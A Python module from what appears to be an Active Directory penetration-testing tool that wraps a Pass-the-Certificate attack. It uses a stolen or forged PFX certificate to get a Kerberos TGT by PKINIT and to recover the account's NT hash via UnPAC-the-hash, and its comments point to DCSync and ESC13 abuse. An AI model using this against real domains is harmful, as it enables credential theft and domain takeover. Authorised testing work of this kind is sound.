"""Native Pass-the-Certificate adapter.

Wraps :func:`authenticate_with_cert_native` (kerbad PKINIT + UnPAC-the-hash)
in the same result shape as :class:`PassTheCertificateResult`, so
``shell.ptc_certipy`` can route the result through its existing post-processing
pipeline (table render, attack-graph status, credential store, identity
inference fallback) without changes.

Public entry points: :func:`pass_the_certificate_native`, :class:`PassTheCertificateResult`.
"""

from __future__ import annotations

import os
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Mapping, Optional

from adscan_internal import telemetry
from adscan_internal.services.async_bridge import run_async_sync

from adscan_internal.services.adcs.cert_auth import (
    CertAuthConfig,
    authenticate_with_cert_native,
)
from adscan_core.rich_output import print_exception


@dataclass
class PassTheCertificateResult:
    """Result of a Pass-the-Certificate operation.

    Attributes:
        domain: Target AD domain.
        principal: Full principal string (e.g. ``user@dom``).
        username: Parsed username component.
        resolved_domain: Parsed domain component (from principal or fallback
            to ``domain`` argument).
        nt_hash: Extracted NT hash (if any).
        ticket_path: Extracted Kerberos ccache path (if any).
        raw_output: Combined stdout/stderr from the underlying tool.
        success: Whether the operation appears to have succeeded.
        error_message: Optional human-readable error description.
    """

    domain: str
    principal: Optional[str]
    username: Optional[str]
    resolved_domain: Optional[str]
    nt_hash: Optional[str]
    ticket_path: Optional[str]
    raw_output: str
    success: bool
    error_message: Optional[str] = None


def _resolve_async(coro):
    """Run an awaitable from a sync caller, even when an outer event loop is
    already running (lab runner, embedding harness)."""
    return run_async_sync(coro)


def _extract_username_from_pfx(pfx_path: str, pfx_password: str) -> Optional[str]:
    """Best-effort SAN UPN extraction from a PFX, used as identity fallback."""
    try:
        from asn1crypto import core as asn1core
        from cryptography import x509 as cx509
        from cryptography.hazmat.primitives.serialization import pkcs12 as _pkcs12
        from cryptography.x509.oid import ExtensionOID

        _, cert, _ = _pkcs12.load_key_and_certificates(
            Path(pfx_path).read_bytes(),
            (pfx_password or "").encode(),
        )
        if cert is None:
            return None
        try:
            san_ext = cert.extensions.get_extension_for_oid(
                ExtensionOID.SUBJECT_ALTERNATIVE_NAME
            )
        except Exception:  # noqa: BLE001
            return None
        upn_oid = "1.3.6.1.4.1.311.20.2.3"
        for entry in san_ext.value.get_values_for_type(cx509.OtherName):
            if entry.type_id == cx509.ObjectIdentifier(upn_oid):
                return asn1core.UTF8String.load(entry.value).native
    except Exception:  # noqa: BLE001
        return None
    return None


def _compute_skip_unpac(
    domains_data: Optional[Mapping[str, Any]], domain: str
) -> bool:
    """Decide whether to skip the UnPAC-the-hash U2U round-trip.

    Returns True only when posture reports ``NTLM_AUTHENTICATION`` as DISABLED
    with HIGH confidence for ``domain`` — on such domains the PAC carries no
    NTLM credential, so the U2U could never recover an NT hash. Any other
    state (UNKNOWN, ENABLED, stale, low-confidence) returns False so the U2U
    runs as before (observe-don't-infer). Never reimplements posture detection
    — it consumes the canonical :func:`get_constraint` helper. Best-effort:
    any failure resolves to False (run the U2U).
    """
    if not domains_data or not domain:
        return False
    try:
        from adscan_internal.services.domain_posture import (
            ConstraintCategory,
            SignalConfidence,
            TriState,
            get_constraint,
        )

        ntlm = get_constraint(
            domains_data,
            domain=domain,
            category=ConstraintCategory.NTLM_AUTHENTICATION,
        )
        return (
            ntlm.effective_state is TriState.DISABLED
            and ntlm.confidence is SignalConfidence.HIGH
        )
    except Exception:  # noqa: BLE001 — posture read is advisory, never fatal.
        return False


def pass_the_certificate_native(
    *,
    domain: str,
    pdc_ip: str,
    pfx_file: str,
    pfx_password: Optional[str] = None,
    username: Optional[str] = None,
    cwd: Optional[str] = None,
    domains_data: Optional[Mapping[str, Any]] = None,
) -> PassTheCertificateResult:
    """Native PKINIT + UnPAC-the-hash using kerbad.

    Returns a :class:`PassTheCertificateResult` so the caller
    (``shell.ptc_certipy``) can route the result through its existing
    post-processing pipeline unchanged.

    A PKINIT TGT (ccache) is itself a full authentication, so the result is
    marked ``success=True`` once a usable principal + ccache exist; the NT
    hash recovered via UnPAC is a best-effort bonus. When ``domains_data`` is
    supplied and posture reports NTLM as DISABLED (HIGH confidence) for
    ``domain``, the UnPAC U2U round-trip is skipped entirely (it could never
    recover a hash on such domains) — see :func:`_compute_skip_unpac`.

    Args:
        domains_data: Optional workspace ``domains_data`` mapping used to read
            the domain posture (NTLM state). When omitted, the UnPAC U2U runs
            as before.
    """
    output_dir = Path(cwd) if cwd else Path.cwd()
    try:
        output_dir.mkdir(parents=True, exist_ok=True)
    except Exception:  # noqa: BLE001 — non-fatal; we'll still try the call.
        pass

    # Identity inference: when the caller didn't pass a username, lift it
    # from the cert's SAN UPN.  kerbad needs this BEFORE PKINIT so the AS-REQ
    # cname is set correctly.
    effective_username = (username or "").strip() or None
    san_upn: Optional[str] = None
    if not effective_username:
        san_upn = _extract_username_from_pfx(pfx_file, pfx_password or "")
        if san_upn:
            effective_username = san_upn.split("@", 1)[0]

    # Posture-aware: on NTLM-disabled (HIGH) domains the PAC carries no NTLM
    # credential, so UnPAC-the-hash can never recover a hash — skip the wasted
    # U2U round-trip. The PKINIT ccache remains the deliverable either way.
    skip_unpac = _compute_skip_unpac(domains_data, domain)

    cfg = CertAuthConfig(
        domain=domain,
        kdc_ip=pdc_ip,
        pfx_path=Path(pfx_file),
        pfx_password=pfx_password or "",
        username=effective_username,
        skip_unpac=skip_unpac,
    )

    try:
        result = _resolve_async(authenticate_with_cert_native(cfg, output_dir))
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return PassTheCertificateResult(
            domain=domain,
            principal=None,
            username=effective_username,
            resolved_domain=None,
            nt_hash=None,
            ticket_path=None,
            raw_output=f"native PKINIT raised {type(exc).__name__}: {exc}",
            success=False,
            error_message=str(exc),
        )

    if not result.success:
        # Surface "identity" in the error message when relevant — keeps
        # ptc_certipy's identity-inference branch (`"identity" in error`)
        # working without changes.
        err = result.error or "PKINIT failed"
        if not effective_username and "identity" not in err.lower():
            err = f"identity not provided: {err}"
        return PassTheCertificateResult(
            domain=domain,
            principal=None,
            username=effective_username,
            resolved_domain=None,
            nt_hash=None,
            ticket_path=None,
            raw_output=err,
            success=False,
            error_message=err,
        )

    # Parse principal -> username + realm.
    principal = result.principal or ""
    parsed_user, _, parsed_realm = principal.partition("@")
    resolved_domain = parsed_realm or domain

    nt_hash = result.nt_hash
    ticket_path = str(result.ccache_path) if result.ccache_path else None
    # Success = we obtained a usable credential for the principal. A PKINIT TGT
    # (ccache) IS a full authentication: usable for Kerberos-backed next steps
    # (DCSync/DRSUAPI, LDAP, SMB) and, for ESC13, it already carries the
    # issuance-policy OID -> group membership in its PAC. UnPAC-the-hash
    # (NT-hash recovery) is a best-effort BONUS that is EXPECTED to fail on
    # NTLM-disabled / AES-only domains (no NTLM credential in the PAC) and must
    # NOT fail the step — the ccache is the deliverable. Posture-aware callers
    # skip the U2U round-trip entirely when NTLM is known-disabled.
    success = bool(parsed_user and (ticket_path or nt_hash))
    error_message: Optional[str] = None
    if not success:
        error_message = (
            "PKINIT did not obtain a usable credential (no TGT/ccache and no NT hash)."
        )

    raw_output = (
        f"[+] PKINIT principal: {principal}\n"
        f"[+] ccache: {result.ccache_path}\n"
        f"[+] NT hash: {'yes' if nt_hash else 'no'}\n"
    )

    return PassTheCertificateResult(
        domain=domain,
        principal=principal or None,
        username=parsed_user or effective_username,
        resolved_domain=resolved_domain,
        nt_hash=nt_hash,
        ticket_path=ticket_path,
        raw_output=raw_output,
        success=success,
        error_message=error_message,
    )


def native_ptc_enabled() -> bool:
    """Honor the ``ADSCAN_ADCS_NATIVE`` env flag (default ON)."""
    return os.environ.get("ADSCAN_ADCS_NATIVE", "1").lower() not in (
        "0",
        "false",
        "no",
        "off",
    )


__all__ = ["PassTheCertificateResult", "pass_the_certificate_native", "native_ptc_enabled"]
